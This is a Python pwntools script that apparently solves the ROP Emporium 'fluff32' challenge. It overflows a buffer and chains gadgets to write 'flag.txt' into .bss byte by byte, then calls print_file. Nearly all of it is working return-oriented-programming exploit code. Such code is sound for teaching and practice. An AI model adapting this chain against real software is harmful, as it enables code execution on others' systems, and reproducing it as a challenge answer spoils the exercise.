from pwn import *
plt_printfile = 0x080483D0
pop_ebp_ret = 0x080485bb
mov_eax_ebp_mov_ebx_b0bababa_pext_edx_ebx_eax_mov_eax_deadbeef_ret = 0x08048543
xchg_ptrecx_dl_ret = 0x08048555
pop_ecx_bswap_ecx_ret = 0x08048558
bssaddr = 0x0804A020
p = process('./fluff32')
f = 0x0b4b
l = 0x02dd
a = 0x1d46
g = 0x0b5a
dot = 0x00db
t = 0x0acd
x = 0x1ac5
t = 0x0acd
#gdb.attach(p,"b *main")


payload = 'A'*0x28 + p32(0) 
payload += p32(pop_ebp_ret)
payload += p32(f)
payload += p32(mov_eax_ebp_mov_ebx_b0bababa_pext_edx_ebx_eax_mov_eax_deadbeef_ret)
payload += p32(pop_ecx_bswap_ecx_ret)
payload += p32(bssaddr, endian='big', sign='unsigned')
payload += p32(xchg_ptrecx_dl_ret)

payload += p32(pop_ebp_ret)
payload += p32(l)
payload += p32(mov_eax_ebp_mov_ebx_b0bababa_pext_edx_ebx_eax_mov_eax_deadbeef_ret)
payload += p32(pop_ecx_bswap_ecx_ret)
payload += p32(bssaddr+1, endian='big', sign='unsigned')
payload += p32(xchg_ptrecx_dl_ret)

payload += p32(pop_ebp_ret)
payload += p32(a)
payload += p32(mov_eax_ebp_mov_ebx_b0bababa_pext_edx_ebx_eax_mov_eax_deadbeef_ret)
payload += p32(pop_ecx_bswap_ecx_ret)
payload += p32(bssaddr+2, endian='big', sign='unsigned')
payload += p32(xchg_ptrecx_dl_ret)

payload += p32(pop_ebp_ret)
payload += p32(g)
payload += p32(mov_eax_ebp_mov_ebx_b0bababa_pext_edx_ebx_eax_mov_eax_deadbeef_ret)
payload += p32(pop_ecx_bswap_ecx_ret)
payload += p32(bssaddr+3, endian='big', sign='unsigned')
payload += p32(xchg_ptrecx_dl_ret)

payload += p32(pop_ebp_ret)
payload += p32(dot)
payload += p32(mov_eax_ebp_mov_ebx_b0bababa_pext_edx_ebx_eax_mov_eax_deadbeef_ret)
payload += p32(pop_ecx_bswap_ecx_ret)
payload += p32(bssaddr+4, endian='big', sign='unsigned')
payload += p32(xchg_ptrecx_dl_ret)

payload += p32(pop_ebp_ret)
payload += p32(t)
payload += p32(mov_eax_ebp_mov_ebx_b0bababa_pext_edx_ebx_eax_mov_eax_deadbeef_ret)
payload += p32(pop_ecx_bswap_ecx_ret)
payload += p32(bssaddr+5, endian='big', sign='unsigned')
payload += p32(xchg_ptrecx_dl_ret)

payload += p32(pop_ebp_ret)
payload += p32(x)
payload += p32(mov_eax_ebp_mov_ebx_b0bababa_pext_edx_ebx_eax_mov_eax_deadbeef_ret)
payload += p32(pop_ecx_bswap_ecx_ret)
payload += p32(bssaddr+6, endian='big', sign='unsigned')
payload += p32(xchg_ptrecx_dl_ret)

payload += p32(pop_ebp_ret)
payload += p32(t)
payload += p32(mov_eax_ebp_mov_ebx_b0bababa_pext_edx_ebx_eax_mov_eax_deadbeef_ret)
payload += p32(pop_ecx_bswap_ecx_ret)
payload += p32(bssaddr+7, endian='big', sign='unsigned')
payload += p32(xchg_ptrecx_dl_ret)
 
payload += p32(plt_printfile)
payload += p32(0)
payload += p32(bssaddr)
p.recvuntil('> ')
p.sendline(payload)
p.interactive()
